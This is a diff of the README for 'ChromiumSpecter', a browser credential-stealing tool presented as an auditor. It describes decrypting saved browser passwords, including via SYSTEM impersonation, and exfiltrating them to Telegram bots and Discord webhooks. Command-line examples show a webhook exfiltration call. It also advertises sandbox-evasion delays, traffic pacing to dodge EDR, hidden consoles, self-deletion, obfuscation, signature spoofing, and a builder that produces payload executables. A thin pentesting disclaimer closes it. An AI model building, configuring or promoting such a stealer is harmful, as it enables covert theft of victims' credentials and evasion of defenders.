@@ -1,4 +1,4 @@
-# 🛡️ ChromiumSpecter Auditor Suite `v2.5.0` (V20 Update)
+# 🛡️ ChromiumSpecter Auditor Suite `v2.5.0` (V20 Stable)
 
 > [!NOTE]
 > **English Version** | [Versión en Español](README.md)
@@ -32,20 +32,21 @@
 ### 🌟 Key Features
 
 * **🖥️ High-Density Dashboard**: Professional graphical interface with real-time consoles, dynamic statistics, and result management.
-* **🔐 Dual Decryption Engine (v2.0.0)**:
-  * Simultaneous support for **AES-GCM (Chromium v80+)**, **DPAPI Legacy**, and **v20 (App-Bound Encryption)** in the same profile database.
-  * Per-individual blob decryption — a migrated profile can have entries of multiple types and they are processed correctly without discarding anything.
-  * Automatic scheme detection by prefix (`v10`/`v11`/`v20`) with intelligent fallback to DPAPI if AES fails.
-  * Profiles without AES key (old Chrome) continue to be processed in pure DPAPI mode.
+* **🔐 Next-Gen Decryption Engine (v20 Support) `v2.5.0`**:
+  * Full support for **Chrome v127+ (App-Bound Encryption)** via the new `v20_decryptor` module.
+  * Hybrid Decryption: Supports **AES-GCM (v10/v11)**, **DPAPI Legacy**, and the new **v20** scheme in the same database.
+  * **Intelligent Synchronization**: The engine now uses dynamic imports to survive obfuscators and ensure portability.
+  * **Privilege Escalation**: Implements native SYSTEM impersonation (via `winlogon.exe`) to extract system-protected keys. **(Requires running as Administrator)**.
+  * Smart detection: The engine identifies the prefix (`v10`, `v11`, `v20`) and applies the corresponding algorithm with automatic fallback.
 * **🕵️ Tactical Stealth Engine**:
   * **Startup Delay**: Initial delay selector (0-300s) to evade analysis in Sandboxes.
-  * **Inter-file Delay (`send_delay`)**: Customizable pauses between uploads to prevent traffic spikes that alert firewalls or EDRs.
+  * **Inter-file Delay (`send_delay`)**: Customizable pauses between sends to prevent traffic spikes that alert firewalls or EDRs.
   * **Anti-Forensics**: Support for **Tactical Self-Destruct** (Auto-Delete) of the binary after execution.
-  * **Panic Protocol**: Total sanitization of the audit environment with a single click.
-* **🧠 Intelligent Profile Detection**:
+  * **Panic Protocol**: Total audit environment sanitization with a single click.
+* **🧠 Smart Profile Detection**:
   * Differentiated scanning: Chrome/Edge/Brave use subdirectories (`Default`, `Profile N`); Opera/Vivaldi use the root directly.
   * File size validation before processing (avoids false positives with empty DBs).
-  * `PermissionError` handling per profile without aborting the entire scan.
+  * `PermissionError` handling per profile without aborting the full scan.
 
 <div align="center">
   <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
@@ -53,16 +54,16 @@
 
 ### 🚀 Smart Exfiltration
 
-* **Auto-Exfiltrate**: Automatic upload configuration immediately after audit.
+* **Auto-Exfiltration**: Configuration for immediate automatic sending after auditing.
 * **Multi-Channel**: Native support for **Telegram Bots** and **Discord Webhooks** with redundancy.
 * **Local Persistence**: Secure saving of exfiltration configurations for recurring use.
 
-### 🛠️ Integrated Visual Builder `v2.0.0`
+### 🛠️ Integrated Visual Builder `v2.5.0`
 
-* **Custom Stub Generation**: Dynamic injection of parameters.
-* **Universal Dependency Injection**: The builder now automatically parses `requirements.txt` and resolves dependencies at compile time.
-* **Metadata Spoofing**: Integrated presets to clone signatures.
-* **Compression and Obfuscation**: Native support for UPX and PyArmor.
+Custom stub generation with **Dynamic Parameter Injection**.
+**Universal Dependency Injection**: The builder now automatically parses `requirements.txt` and resolves dependencies at compile time.
+**Metadata Spoofing**: Built-in presets to clone signatures.
+**Compression and Obfuscation**: Native support for UPX and PyArmor.
 
 <div align="center">
   <img src="screenshots/builder.png" width="800" alt="ChromiumSpecter Builder">
@@ -73,13 +74,16 @@
 ## 🚀 Tactical Workflow
 
 1. **Configuration**: Define your Telegram/Discord tokens in the **Exfiltration** Tab and save them.
-2. **Audit**: Launch the scan from the Dashboard. You can enable **Auto-exfiltrate** and **Self-Destruct** for a "fire and forget" cycle.
-3. **Inspection**: View decrypted credentials in real-time in the **Results** Tab.
+2. **Audit**: Launch the scan from the Dashboard. You can activate **Auto-exfiltration** and **Self-destruct** for a "fire and forget" cycle.
+3. **Inspection**: Visualize decrypted credentials in real-time in the **Results** Tab.
 4. **Deployment**: Use the **Builder** to generate an `.exe` with your embedded credentials (Base64) and configured stealth presets.
 
 ## 🖥️ Advanced Usage (CLI)
 
-The core engine (`main.py`) can run independently without the graphical interface, ideal for automation or quick terminal deployments.
+The main engine (`main.py`) can be run independently without the GUI, ideal for automation or quick terminal deployments.
+
+> [!IMPORTANT]
+> **PRIVILEGE REQUIREMENT**: To decrypt **Chrome v127+ (V20)** profiles, it is **MANDATORY** to run the terminal (or the `.exe`) with **Administrator privileges**. Without these privileges, the engine will be unable to perform the SYSTEM impersonation required to access the CNG key store.
 
 ```bash
 # Basic audit
@@ -88,7 +92,7 @@ python main.py
 # Audit with automatic exfiltration to Discord
 python main.py --webhook "https://discord.com/api/webhooks/..." --self-destruct
 
-# Silent audit (no console) and saving in custom folder
+# Silent audit (no console) and save to custom folder
 python main.py --stealth --output-dir "C:\temp\logs"
 ```
 
@@ -96,22 +100,22 @@ python main.py --stealth --output-dir "C:\temp\logs"
 
 | Group | Parameter | Description |
 | :--- | :--- | :--- |
-| **Exfiltration** | `--webhook` | Discord Webhook URL for report uploads. |
+| **Exfiltration** | `--webhook` | Discord Webhook URL for report sending. |
 | | `--tg-token` | Telegram bot token. |
 | | `--tg-chat-id` | Telegram chat or channel ID. |
-| | `--no-exfil` | Disables external data upload. |
+| | `--no-exfil` | Disables external data sending. |
 | **Reports** | `--no-html` | Does not generate the visual HTML report. |
 | | `--no-csv` | Does not generate the structured CSV report. |
 | | `--json` | Generates an additional report in JSON format. |
 | | `--output-dir` | Output folder (default: `.audit`). |
-| **Motor** | `--browser` | Filter by specific browser (chrome, brave, etc). |
+| **Engine** | `--browser` | Filters by a specific browser (chrome, brave, etc). |
 | | `--delay` | Initial delay (seconds) before acting. |
 | | `--stealth` | **Stealth Mode**: Hides the console window immediately upon startup (via Windows API). |
-| | `--auto-kill` | Automatically closes browsers if database is locked. |
+| | `--auto-kill` | Automatically closes browsers if the database is locked. |
 | | `--self-destruct` | **Deletes the executable** after the cycle finishes. |
-| | `--no-wipe` | Does not delete local reports after exfiltrating. |
+| | `--no-wipe` | Does not delete local reports after sending. |
 | | `--clean` | Cleans all old reports in the output folder. |
-| | `--debug` | Shows detailed debug logs. |
+| | `--debug` | Shows detailed debugging logs. |
 
 ---
 
@@ -122,35 +126,35 @@ When using the **Builder**, you can inject the following behaviors into your fin
 | Parameter | Range / Option | Purpose |
 | :--- | :--- | :--- |
 | **Initial Delay** | 0s - 3600s | Delay before the first action (Anti-Sandbox). |
-| **Send Delay** | 0s - 60s | Pause between uploaded files (Traffic evasion). |
-| **Webhook Timeout** | 1s - 300s | Wait time for unstable connections. |
-| **📡 Auto-Exfiltrate** | Checkbox | Enables automatic upload without intervention upon execution. |
-| **📡 Stealth Mode** | Runtime Flag | Hides the console at startup (via `ShowWindow` Win32 API). |
+| **Send Delay** | 0s - 60s | Pause between sent files (Traffic evasion). |
+| **Webhook Timeout** | 1s - 300s | Timeout for unstable connections. |
+| **📡 Auto-Exfiltrate** | Checkbox | Enables automatic sending without intervention upon execution. |
+| **📡 Stealth Mode** | Runtime Flag | Hides the console upon startup (via `ShowWindow` Win32 API). |
 | **💥 Self-Destruct** | Checkbox | Deletes the `.exe` after the cycle finishes. |
-| **UAC Prompt** | Toggle | Requests administrator privileges if needed. |
-| **Obfuscate with PyArmor** | Toggle | Applies source code obfuscation before compiling. |
+| **UAC Prompt** | Toggle | Requests administrator privileges if necessary. |
+| **Obfuscate with PyArmor** | Toggle | Applies obfuscation to the source code before compiling. |
 | **UPX Compression** | Toggle | Compresses the final binary (reduces size ~30-50%). |
-| **Show Console** | Compiler Flag | Generates a `Console App`. If unchecked, generates a `Windowed App`. |
+| **Show Console** | Compiler Flag | Generates a `Console App`. If unchecked, generates an invisible `Windowed App`. |
 
 > [!TIP]
 > **Technical Difference — Show Console vs Stealth Mode**:
 > - **Show Console** (Compiler): Determines if the **Operating System** creates the window from scratch. Unchecked = `Windowed App`, there is never a black window.
-> - **Stealth Mode** (Runtime): The window is created, but the code hides it in milliseconds using `ShowWindow(0)`. A brief flash might be visible.
-> - **Recommendation**: Leave "Show Console" **unchecked** + "Stealth Mode" **checked** for double-layer stealth.
-
+> - **Stealth Mode** (Runtime): The window is created, but the code hides it in milliseconds with `ShowWindow(0)`. A brief flash may be seen.
+> - **Recommendation**: Leave "Show Console" **unchecked** + "Stealth Mode" **checked** for double layer of stealth.
+```
 
 ---
 
-## 🛠️ Technology Stack
+## 🛠️ Tech Stack
 
 | Component | Technology |
 | :--- | :--- |
 | **Core UI** | `CustomTkinter` (Modern Dark Theme) |
-| **Cryptography** | `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
+| **Cryptography** | `v20 (App-Bound)`, `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
 | **OS Security** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`) |
 | **Compilation** | `PyInstaller` + `PyArmor` + `UPX` |
 | **Persistence** | Local `JSON` (`.audit/exfil_config.json`) |
-| **Testing** | `pytest` + `pytest-mock` (18 tests, 0 failures) |
+| **Testing** | `pytest` + `pytest-mock` (20 tests, 0 failures) |
 
 ---
 
@@ -206,11 +210,13 @@ pytest -v
 
 ---
 
-## ⚖️ Legal and Ethical Disclaimer
+## ⚖️ License and Ethical Use
+
+### License
+This project is licensed under the **GNU General Public License v3.0 (GPLv3)**. This means you can use, modify, and distribute the software, but any derivative work must also be open-source under the same license and **must give explicit credit to the original author (ANONIMO432HZ)**. See the [LICENSE](LICENSE) file for more details.
 
 > [!CAUTION]
 > **THIS SOFTWARE IS FOR ETHICAL PENTESTING AND PROFESSIONAL AUDITING PURPOSES.**
-> Using this tool to access systems without explicit authorization from the owner is illegal. The author assumes no responsibility for the misuse of this suite.
+> Using this tool to access systems without the explicit authorization of the owner is illegal. The author assumes no responsibility for the misuse of this suite.
 
 ---
-
